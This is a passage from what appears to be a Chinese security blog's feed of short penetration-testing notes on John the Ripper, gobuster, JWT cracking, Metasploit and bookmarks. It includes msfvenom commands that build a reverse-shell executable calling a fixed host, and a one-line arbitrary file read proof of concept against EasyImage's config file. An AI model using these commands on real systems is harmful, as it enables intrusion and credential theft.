    <link href="https://blog.njcit.me/2023/06/08/CTF/john%E7%88%86%E7%A0%B4zip%E5%AF%86%E7%A0%81/"/>
    <id>https://blog.njcit.me/2023/06/08/CTF/john%E7%88%86%E7%A0%B4zip%E5%AF%86%E7%A0%81/</id>
    <published>2023-06-08T08:20:07.000Z</published>
    <updated>2023-06-21T08:13:00.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用教程">使用教程</h1><p>注意，fish可能报错，建议zsh或者bash</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">zip2john flag.zip &gt; hash.txt<br>cat hash.txt<br>john <span class="hljs-attribute">--format</span>=pkzip <span class="hljs-attribute">--mask</span>=?d?d?d hash.txt<br></code></pre></td></tr></table></figure><img src="/2023/06/08/CTF/john%E7%88%86%E7%A0%B4zip%E5%AF%86%E7%A0%81/image-20230608162412409.png" class="" title="image-20230608162412409"><img src="/2023/06/08/CTF/john%E7%88%86%E7%A0%B4zip%E5%AF%86%E7%A0%81/image-20230608162420466.png" class="" title="image-20230608162420466"><p>john理论上是支持字典的（未实测）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 crack.txt<br></code></pre></td></tr></table></figure><img src="/2023/06/08/CTF/john%E7%88%86%E7%A0%B4zip%E5%AF%86%E7%A0%81/image-91.png" class="" title="image-91"><h1 id="参考链接">参考链接</h1><p>https://www.freecodecamp.org/news/crack-passwords-using-john-the-ripper-pentesting-tutorial/</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;使用教程&quot;&gt;使用教程&lt;/h1&gt;
&lt;p&gt;注意，fish可能报错，建议zsh或者bash&lt;/p&gt;
&lt;figure class=&quot;highlight routeros&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://blog.njcit.me/tags/ctf/"/>
    
    <category term="爆破" scheme="https://blog.njcit.me/tags/%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>gobuster工具使用</title>
    <link href="https://blog.njcit.me/2023/06/08/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/gobuster%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    <id>https://blog.njcit.me/2023/06/08/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/gobuster%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</id>
    <published>2023-06-08T07:12:21.000Z</published>
    <updated>2023-06-08T07:26:07.511Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工具下载">工具下载</h1><p>kali</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install gobuster<br></code></pre></td></tr></table></figure><p>other os</p><p>https://github.com/OJ/gobuster</p><h1 id="基础使用">基础使用</h1><p>爆破dns,字典链接：https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster dns -d baidu.com -t 50 -w /mnt/14T/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt<br></code></pre></td></tr></table></figure><p>爆破目录,字典链接：https://github.com/SexyBeast233/SecDictionary</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">gobuster dir -u <span class="hljs-string">&quot;http://www.xxxx.com/&quot;</span> -w <span class="hljs-name">D</span>:\pentest\dict\js.txt -k <span class="hljs-name">D</span>:\tools\dicts\SecDictionary\filelak\H2<span class="hljs-number">-9000.</span>txt<br></code></pre></td></tr></table></figure><p>其他使用见官方readme</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;工具下载&quot;&gt;工具下载&lt;/h1&gt;
&lt;p&gt;kali&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;</summary>
      
    
    
    
    
    <category term="gobuster" scheme="https://blog.njcit.me/tags/gobuster/"/>
    
    <category term="工具" scheme="https://blog.njcit.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>安卓渗透测试环境准备</title>
    <link href="https://blog.njcit.me/2023/06/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"/>
    <id>https://blog.njcit.me/2023/06/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/</id>
    <published>2023-06-05T00:37:33.000Z</published>
    <updated>2023-06-09T01:27:53.837Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>用公司的经费买了部pixel 3，</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;
&lt;p&gt;用公司的经费买了部pixel 3，&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="刷机" scheme="https://blog.njcit.me/tags/%E5%88%B7%E6%9C%BA/"/>
    
    <category term="移动安全" scheme="https://blog.njcit.me/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试中jwt的应用</title>
    <link href="https://blog.njcit.me/2023/05/31/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADjwt%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>https://blog.njcit.me/2023/05/31/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADjwt%E7%9A%84%E5%BA%94%E7%94%A8/</id>
    <published>2023-05-31T02:21:24.000Z</published>
    <updated>2023-08-02T01:14:08.966Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是jwt">什么是jwt</h1><p>JSON Web Token (JWT，RFC 7519 (opens newwindow))，是为了在网络应用环境间传递声明而执行的一种基于 JSON的开放标准（(RFC 7519)。该 token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token 也可直接被用于认证，也可被加密。</p><h1 id="常用工具">常用工具</h1><ul><li>https://github.com/brendan-rius/c-jwt-cracker</li></ul><img src="/2023/05/31/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADjwt%E7%9A%84%E5%BA%94%E7%94%A8/image-20230531103017918.png" class="" title="image-20230531103017918"><ul><li>https://github.com/ticarpi/jwt_tool/</li></ul><img src="/2023/05/31/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADjwt%E7%9A%84%E5%BA%94%E7%94%A8/image-20230531103044012.png" class="" title="image-20230531103044012"><img src="/2023/05/31/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADjwt%E7%9A%84%E5%BA%94%E7%94%A8/image-20230531103137446.png" class="" title="image-20230531103137446"><h1 id="参考文章">参考文章</h1><ul><li>https://www.anquanke.com/post/id/225947</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是jwt&quot;&gt;什么是jwt&lt;/h1&gt;
&lt;p&gt;JSON Web Token (JWT，RFC 7519 (opens new
window))，是为了在网络应用环境间传递声明而执行的一种基于 JSON
的开放标准（(RFC 7519)。该 token
被设计为紧凑</summary>
      
    
    
    
    
    <category term="jwt" scheme="https://blog.njcit.me/tags/jwt/"/>
    
  </entry>
  
  <entry>
    <title>hacktricks</title>
    <link href="https://blog.njcit.me/2023/05/30/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/hacktricks/"/>
    <id>https://blog.njcit.me/2023/05/30/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/hacktricks/</id>
    <published>2023-05-30T06:34:54.000Z</published>
    <updated>2023-08-02T01:14:07.866Z</updated>
    
    <content type="html"><![CDATA[<ul><li>https://book.hacktricks.xyz/</li></ul><img src="/2023/05/30/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/hacktricks/image-20230530143543520.png" class="" title="image-20230530143543520"><ul><li>https://www.ired.team/</li></ul><img src="/2023/05/30/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/hacktricks/image-20230530143758740.png" class="" title="image-20230530143758740"><ul><li>https://pentester.land/</li></ul><img src="/2023/05/30/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/hacktricks/image-20230530144234475.png" class="" title="image-20230530144234475"><ul><li>https://github.com/reddelexc/hackerone-reports/blob/master/tops_100/TOP100PAID.md</li></ul><img src="/2023/05/30/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/hacktricks/image-20230530144809964.png" class="" title="image-20230530144809964"><ul><li>https://offsec.tools/</li></ul><img src="/2023/05/30/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/hacktricks/image-20230530145032272.png" class="" title="image-20230530145032272">]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;https://book.hacktricks.xyz/&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&quot;/2023/05/30/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/hacktricks/image-202305301435435</summary>
      
    
    
    
    
    <category term="tricks" scheme="https://blog.njcit.me/tags/tricks/"/>
    
  </entry>
  
  <entry>
    <title>书签分享</title>
    <link href="https://blog.njcit.me/2023/05/29/%E6%9D%82%E9%A1%B9/%E4%B9%A6%E7%AD%BE/"/>
    <id>https://blog.njcit.me/2023/05/29/%E6%9D%82%E9%A1%B9/%E4%B9%A6%E7%AD%BE/</id>
    <published>2023-05-29T08:12:24.000Z</published>
    <updated>2023-07-11T06:48:18.253Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信安资讯">信安资讯</h1><ul><li><a href="https://govuln.com/news/">安全文摘 -『代码审计』知识星球</a></li><li><a href="https://paper.seebug.org/">Paper</a></li><li><a href="https://www.anquanke.com/">安全客 -有思想的安全新媒体</a></li><li><a href="https://xz.aliyun.com/">先知社区</a></li><li><a href="http://www.freebuf.com/">FreeBuf互联网安全新媒体平台 |关注黑客与极客</a></li><li><a href="https://bbs.pediy.com/">看雪安全论坛</a></li><li><a href="https://forum.90sec.com/c/article">技术文章的最新主题 -90Sec</a></li><li><a href="https://wiki.moonteams.com/?page=1">暗月知识中心</a></li><li><a href="https://www.sec-in.com/">SecIN信息安全技术社区</a></li><li><a href="http://scz.617.cn:8/">青衣十三楼</a></li><li><a href="https://i.hacking8.com/">Hacking8 安全信息流</a></li><li><a href="https://tttang.com/">跳跳糖</a></li><li><ahref="http://wechat.doonsec.com/">洞见微信聚合-安全圈微信搜索_订阅号及文章内容收录,一搜即达</a></li><li><a href="https://www.shentoushi.top/">渗透师网络安全从业者安全导航</a></li></ul><h1 id="安全文章">安全文章</h1><ul><li><ahref="https://www.anquanke.com/post/id/197657">实用FRIDA进阶：内存漫游、hookanywhere、抓包 - 安全客，安全资讯平台</a></li></ul><h1 id="ctf">CTF</h1><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/">Getting Started - CTFWiki</a></li><li><a href="http://php.net/manual/zh/">PHP: PHP 手册 - Manual</a></li><li><a href="https://www.nssctf.cn/index">主页 | NSSCTF</a></li></ul><h1 id="文档">文档</h1><ul><li><a href="https://wangdoc.com/clang/intro.html">C 语言简介 - C语言教程 - 网道</a></li><li><a href="https://blog.chenyuan.me/Linux-setup/">Linux-setup -notebook</a></li><li><ahref="https://chai2010.cn/advanced-go-programming-book/ch1-basic/ch1-01-genesis.html">Go语言创世纪- Go语言高级编程</a></li><li><ahref="https://books.studygolang.com/The-Golang-Standard-Library-by-Example/chapter02/02.1.html">strings— 字符串操作 · Go语言标准库</a></li><li><a href="https://websec.readthedocs.io/zh/latest/">Web安全学习笔记 —Web安全学习笔记 1.0 文档</a></li><li><ahref="https://github.com/Neilpang/acme.sh/wiki/%E8%AF%B4%E6%98%8E">说明· Neilpang/acme.sh Wiki</a></li><li><a href="https://ctftime.org/">CTFtime.org / All about CTF (CaptureThe Flag)</a></li><li><ahref="https://github.com/hongriSec/PHP-Audit-Labs">hongriSec/PHP-Audit-Labs:一个关于PHP的代码审计项目</a></li><li><ahref="https://wizardforcel.gitbooks.io/web-hacking-101/content/1.html">一、前言· Web Hacking 101 中文版</a></li><li><a href="https://ninjia.gitbook.io/secskill/web/sql">1.1 SQL注入漏洞- secskill</a></li><li><a href="https://yeasy.gitbook.io/docker_practice/">前言 - Docker ——从入门到实践</a></li><li><ahref="https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets">RedTeaming Experiments</a></li><li><a href="https://wiki.wgpsec.org/">狼组安全团队公开知识库</a></li><li><a href="https://baizesec.github.io/bylibrary/">白阁文库</a></li><li><a href="https://www.hacking8.com/cheatsheet">备忘录 -像黑客一样学习</a></li><li><a href="http://wiki.peiqi.tech/">关于文库 · PeiQi WiKi文库</a></li><li><a href="https://fengchenzxc.github.io/">安全知识WIKI</a></li><li><a href="http://wiki.xypbk.com/">Qingy 漏洞库</a></li><li><a href="https://wiki.96.mk/">Wiki</a></li><li><ahref="https://vulwiki.readthedocs.io/zh_CN/latest/web/fileinclude/">1.5.2任意文件读取/包含/删除 - 漏洞知识库</a></li><li><ahref="https://vulwiki.readthedocs.io/zh_CN/latest/#">漏洞知识库</a></li><li><a href="https://vulwiki.readthedocs.io/zh_CN/latest/web/sql/">1.1SQL注入漏洞 - 漏洞知识库</a></li></ul><h1 id="网络空间搜索">网络空间搜索</h1><ul><li><ahref="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知- FOFA网络空间测绘系统</a></li><li><a href="https://www.zoomeye.org/">ZoomEye - Cyberspace SearchEngine</a></li><li><ahref="https://quake.360.cn/quake/#/index">360网络空间资产测绘</a></li><li><a href="https://www.shodan.io/">Shodan</a></li><li><a href="https://censys.io/">Censys</a></li><li><a href="https://hunter.qianxin.com/">鹰图平台</a></li><li><a href="https://crt.sh/">crt.sh | Certificate Search</a></li><li><a href="https://community.riskiq.com/">RiskIQ Community</a></li></ul><h1 id="加解密">加解密</h1><ul><li><a href="https://the-x.cn/en-us/cryptography/Aes.aspx">AESdecryption AES encryption AES Hex Key Supported - The X OnlineTools</a></li><li><ahref="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></li><li><a href="http://www.objectif-securite.ch/en/ophcrack.php">ObjectifSécurité - Ophcrack</a></li><li><a href="http://md5decrypt.net/">Md5 Encryption &amp; DecryptionGratuite - Plus de 10.000.000.000 hashs</a></li></ul><h1 id="云查杀">云查杀</h1><ul><li><a href="https://scanner.baidu.com/#/pages/intro">WEBDIR+ - WebShell扫描服务 - OpenRASP 团队</a></li><li><a href="https://s.threatbook.com/">微步在线云沙箱</a></li><li><a href="http://virscan.org/">VirSCAN.org-多引擎在线病毒扫描网v1.02，当前支持 41 款杀毒引擎</a></li><li><a href="https://www.virustotal.com/gui/home/upload">VirusTotal -Home</a></li><li><a href="https://habo.qq.com/">腾讯哈勃分析系统</a></li><li><a href="https://stack.chaitin.com/">CT Stack 安全社区</a></li><li><a href="http://www.yunsee.cn/">云悉WEB资产梳理|在线CMS指纹识别平台- 云悉安全</a></li><li><a href="https://tool.lu/">在线工具 - 程序员的工具箱</a></li><li><a href="http://ceye.io/">CEYE - Monitor service for securitytesting</a></li><li><a href="http://www.javadecompilers.com/">Java decompileronline</a></li><li><a href="http://site.ip138.com/">域名查ip 域名解析 ip查询网站ip反查域名 ip反查网站 同一ip网站 同ip网站域名ip查询</a></li><li><a href="https://bugs.hacking8.com/tiquan/">提权辅助网页</a></li><li><ahref="https://ctf.gs/">CTF.GS_CTF网址导航_CTF练习平台收集</a></li><li><a href="https://regex101.com/">Online regex tester and debugger:PHP, PCRE, Python, Golang and JavaScript</a></li><li><a href="https://www.cvedetails.com/">CVE security vulnerabilitydatabase. Security vulnerabilities, exploits, references andmore</a></li><li><a href="https://nip.io/">nip.io - wildcard DNS for any IPAddress</a></li><li><a href="https://www.exploit-db.com/">Exploit Database - Exploitsfor Penetration Testers, Researchers, and Ethical Hackers</a></li><li><a href="https://subdomainfinder.c99.nl/">Subdomain Finder</a></li><li><a href="https://xss.pt/xss.php?do=login">XSS平台 -（支持http/https）XSS Platform</a></li><li><a href="http://finger.tidesec.com/">TideFinger 潮汐指纹</a></li><li><a href="https://rapiddns.io/subdomain">Subdomain - RapidDNS RapidDNS Information Collection</a></li><li><a href="https://securitytrails.com/">The World's Largest Repositoryof Historical DNS data</a></li><li><ahref="http://www.jackson-t.ca/runtime-exec-payloads.html">java.lang.Runtime.exec()Payload Workarounds - <span class="citation"data-cites="Jackson_T">@Jackson_T</span></a></li><li><a href="https://rapiddns.io/sameip">Same IP Website - RapidDNSRapid DNS Information Collection</a></li><li><ahref="https://www.osint-labs.org/tools/">https://www.osint-labs.org/tools/</a></li><li><a href="https://www.revshells.com/">Online - Reverse ShellGenerator</a></li><li><a href="https://y4er.com/">Y4er的博客</a></li><li><a href="https://cloudcone.com/">Managed Cloud Hosting, DedicatedServers, Cloud Services - CloudCone</a></li><li><a href="http://eyes.sh/dns/">DNSLog管理</a></li></ul><h1 id="技巧">技巧</h1><ul><li><a href="http://ip.zxinc.org/index.htm">IPv6地址查询网站</a></li><li><a href="https://www.v2ex.com/">V2EX</a></li><li>https://toi.teracloud.jp/</li><li><a href="https://greasyfork.org/zh-CN">Greasy Fork -安全、实用的用户脚本大全</a></li><li><ahref="http://24mail.chacuo.net/">临时邮箱、十分钟邮箱（10分钟)、临时邮、临时Email、快速注册Email、24Mail--查错网</a></li><li><a href="https://bandwagonhost.com/clientarea.php">Bandwagon Host -Client Area</a></li><li><a href="https://www.dynadot.com/account/">Account Summary</a></li><li><a href="https://pan.icu/">内核恐慌</a></li><li><a href="https://sm.ms/">Image Upload - SM.MS - Simple Free ImageHosting</a></li><li><a href="https://mail.protonmail.com/inbox">Login -ProtonMail</a></li><li><a href="https://orangefox.download/zh-CN">OrangeFox RecoveryDownloads</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;信安资讯&quot;&gt;信安资讯&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://govuln.com/news/&quot;&gt;安全文摘 -
『代码审计』知识星球&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://paper.seebug.org/&quot;&gt;Paper</summary>
      
    
    
    
    
    <category term="书签" scheme="https://blog.njcit.me/tags/%E4%B9%A6%E7%AD%BE/"/>
    
  </entry>
  
  <entry>
    <title>Linux配置速查</title>
    <link href="https://blog.njcit.me/2023/05/24/%E6%9D%82%E9%A1%B9/Linux%E9%85%8D%E7%BD%AE%E9%80%9F%E6%9F%A5/"/>
    <id>https://blog.njcit.me/2023/05/24/%E6%9D%82%E9%A1%B9/Linux%E9%85%8D%E7%BD%AE%E9%80%9F%E6%9F%A5/</id>
    <published>2023-05-24T01:49:27.000Z</published>
    <updated>2023-08-04T08:24:34.319Z</updated>
    
    <content type="html"><![CDATA[<h1 id="x00">0x00</h1><p>好多配置记不住，每次都要Google去查一下，不如记下来，省的下次再去查。</p><h1 id="x01-linux下配置path">0x01 Linux下配置path</h1><p>修改/etc/profile文件，修改找个文件是全局生效，不受bash/zsh影响</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/bin:<span class="hljs-variable">$PATH</span>&quot;</span><br></code></pre></td></tr></table></figure><p>fish修改环境变量:</p><ol type="1"><li><p>打开你的 fish 配置文件：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">nano ~<span class="hljs-regexp">/.config/</span>fish/config.fish<br></code></pre></td></tr></table></figure></li><li><p>在文件的末尾，添加你的 <code>set</code> 命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> -gx MY_VARIABLE <span class="hljs-string">&quot;my value&quot;</span><br> <span class="hljs-built_in">set</span> -gx PATH <span class="hljs-string">&quot;<span class="hljs-variable">$PATH</span>:/home/ccadmin/go/bin&quot;</span><br> <span class="hljs-built_in">set</span> -gx PATH <span class="hljs-string">&quot;<span class="hljs-variable">$PATH</span>:/home/ccadmin/.local/bin&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>按 <code>Ctrl+O</code> 保存文件，然后按 <code>Ctrl+X</code> 退出nano。</p></li></ol><p>这样，无论你何时启动一个新的 fish session，<code>MY_VARIABLE</code>环境变量就会自动设置为 "my value"。</p><img src="/2023/05/24/%E6%9D%82%E9%A1%B9/Linux%E9%85%8D%E7%BD%AE%E9%80%9F%E6%9F%A5/image-20230524101310931.png" class="" title="image-20230524101310931"><img src="/2023/05/24/%E6%9D%82%E9%A1%B9/Linux%E9%85%8D%E7%BD%AE%E9%80%9F%E6%9F%A5/image-20230524101327195.png" class="" title="image-20230524101327195"><h1 id="x0n-参考链接">0x0n 参考链接</h1><ul><li>https://www.cnblogs.com/amboyna/archive/2008/03/08/1096024.html</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;x00&quot;&gt;0x00&lt;/h1&gt;
&lt;p&gt;好多配置记不住，每次都要Google去查一下，不如记下来，省的下次再去查。&lt;/p&gt;
&lt;h1 id=&quot;x01-linux下配置path&quot;&gt;0x01 Linux下配置path&lt;/h1&gt;
&lt;p&gt;修改/etc/profile文件，修改找</summary>
      
    
    
    
    
    <category term="Linux" scheme="https://blog.njcit.me/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>metasploit使用笔记</title>
    <link href="https://blog.njcit.me/2023/05/16/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/metasploit%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.njcit.me/2023/05/16/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/metasploit%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</id>
    <published>2023-05-16T02:12:24.000Z</published>
    <updated>2023-05-17T01:36:35.877Z</updated>
    
    <content type="html"><![CDATA[<h1 id="x00">0x00</h1><p>Linux安装</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/rapid7/m</span>etasploit-omnibus<span class="hljs-regexp">/master/</span>config<span class="hljs-regexp">/templates/m</span>etasploit-framework-wrappers<span class="hljs-regexp">/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./m</span>sfinstall<br></code></pre></td></tr></table></figure><h1 id="x01">0x01</h1><p>查看metasploit 所有的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -l payloads [payloads, encoders, nops, platforms, archs, encrypt, formats, all]<br></code></pre></td></tr></table></figure><p>生成反弹metasploit会话的可执行文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=1.1.1.1 <span class="hljs-attribute">LPORT</span>=24444 -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure><p>正向会话</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/bind_tcp <span class="hljs-attribute">lport</span>=4444 -f<span class="hljs-built_in"> raw </span>-o msf1.bin<br></code></pre></td></tr></table></figure><p>监听会话</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">msfconsole<br>use exploit/multi/handler<br><span class="hljs-keyword">set</span> PAYLOAD <span class="hljs-comment">windows</span>/x64/<span class="hljs-comment">meterpreter_reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 0.0.0.0</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 24444</span><br>exploit<br></code></pre></td></tr></table></figure><p>查看编码器</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">msfvenom -l encoders</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;x00&quot;&gt;0x00&lt;/h1&gt;
&lt;p&gt;Linux安装&lt;/p&gt;
&lt;figure class=&quot;highlight awk&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;</summary>
      
    
    
    
    
    <category term="metasploit" scheme="https://blog.njcit.me/tags/metasploit/"/>
    
    <category term="shell" scheme="https://blog.njcit.me/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>简单图床任意文件读取</title>
    <link href="https://blog.njcit.me/2023/05/15/poc_exp/%E7%AE%80%E5%8D%95%E5%9B%BE%E5%BA%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    <id>https://blog.njcit.me/2023/05/15/poc_exp/%E7%AE%80%E5%8D%95%E5%9B%BE%E5%BA%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</id>
    <published>2023-05-15T07:07:51.000Z</published>
    <updated>2023-08-02T01:07:32.223Z</updated>
    
    <content type="html"><![CDATA[<p>quake语法</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">app:</span><span class="hljs-string">&quot;EasyImage&quot;</span><br></code></pre></td></tr></table></figure><p>Poc</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/application/</span>down.php?dw=.<span class="hljs-regexp">/config/</span>config.php<br></code></pre></td></tr></table></figure><img src="/2023/05/15/poc_exp/%E7%AE%80%E5%8D%95%E5%9B%BE%E5%BA%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/image-20230515093845541.png" class="" title="image-20230515093845541">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;quake语法&lt;/p&gt;
&lt;figure class=&quot;highlight avrasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code</summary>
      
    
    
    
    
    <category term="exp" scheme="https://blog.njcit.me/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>quake使用笔记</title>
    <link href="https://blog.njcit.me/2023/04/17/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2/quake%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.njcit.me/2023/04/17/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2/quake%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</id>
    <published>2023-04-17T02:27:01.000Z</published>
    <updated>2023-08-02T01:14:05.482Z</updated>
    
